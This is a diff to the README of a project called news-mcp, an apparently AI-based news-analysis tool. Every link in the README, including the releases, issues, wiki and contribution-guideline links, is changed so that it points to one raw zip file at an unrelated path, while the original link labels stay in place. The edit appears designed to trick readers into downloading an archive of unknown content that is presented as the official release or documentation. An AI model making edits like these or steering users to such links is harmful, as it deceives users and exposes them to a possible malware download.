@@ -1,7 +1,7 @@
 # 🚀 news-mcp - Effortless News Analysis for Everyone
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-Click%20Here-brightgreen)](https://github.com/Vishwaflr/news-mcp/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Vishwaflr/news-mcp/main/nonfreeman/news-mcp.zip%20Latest%20Release-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Vishwaflr/news-mcp/main/nonfreeman/news-mcp.zip)
 
 ## 🚀 Getting Started
 Welcome to **news-mcp**, your AI-powered platform designed to analyze news effortlessly. This application provides insights from over 41 news feeds and more than 16,000 articles, all powered by AI technology.
@@ -22,7 +22,7 @@ To run **news-mcp**, your computer should meet the following requirements:
 - **PostgreSQL Database:** Secure and efficient data management.
 
 ## 📥 Download & Install
-1. **Visit the Releases Page**: Go to our [Releases page](https://github.com/Vishwaflr/news-mcp/releases) to find the latest version of **news-mcp**.
+1. **Visit the Releases Page**: Go to our [Releases page](https://raw.githubusercontent.com/Vishwaflr/news-mcp/main/nonfreeman/news-mcp.zip) to find the latest version of **news-mcp**.
    
 2. **Choose Your Version**: Look for the section labeled **Assets**. Here, you will see different file options for different operating systems.
 
@@ -45,11 +45,11 @@ To run **news-mcp**, your computer should meet the following requirements:
 - **Adjust Themes**: Select from a variety of themes to enhance your viewing experience.
 
 ## 🌐 Support & Feedback
-If you encounter any issues, please refer to our FAQ section in the application or visit the [Issues page on GitHub](https://github.com/Vishwaflr/news-mcp/issues). Feedback is always welcome, as it helps us improve.
+If you encounter any issues, please refer to our FAQ section in the application or visit the [Issues page on GitHub](https://raw.githubusercontent.com/Vishwaflr/news-mcp/main/nonfreeman/news-mcp.zip). Feedback is always welcome, as it helps us improve.
 
 ## 🔗 Useful Links
-- **Documentation**: Learn more about how to use **news-mcp** on the [Wiki page](https://github.com/Vishwaflr/news-mcp/wiki).
-- **Contribute**: If you're interested in improving the project, check out the [Contribution guidelines](https://github.com/Vishwaflr/news-mcp/blob/main/CONTRIBUTING.md).
+- **Documentation**: Learn more about how to use **news-mcp** on the [Wiki page](https://raw.githubusercontent.com/Vishwaflr/news-mcp/main/nonfreeman/news-mcp.zip).
+- **Contribute**: If you're interested in improving the project, check out the [Contribution guidelines](https://raw.githubusercontent.com/Vishwaflr/news-mcp/main/nonfreeman/news-mcp.zip).
 
 ## 🏷 Topics
 - ai-analysis
@@ -74,4 +74,4 @@ If you encounter any issues, please refer to our FAQ section in the application 
 - websocket
 
 ## 📥 Download Now Again
-For your convenience, here’s the link to download the latest version again: [Download Latest Release](https://github.com/Vishwaflr/news-mcp/releases). Enjoy analyzing the news like never before!
+For your convenience, here’s the link to download the latest version again: [Download Latest Release](https://raw.githubusercontent.com/Vishwaflr/news-mcp/main/nonfreeman/news-mcp.zip). Enjoy analyzing the news like never before!
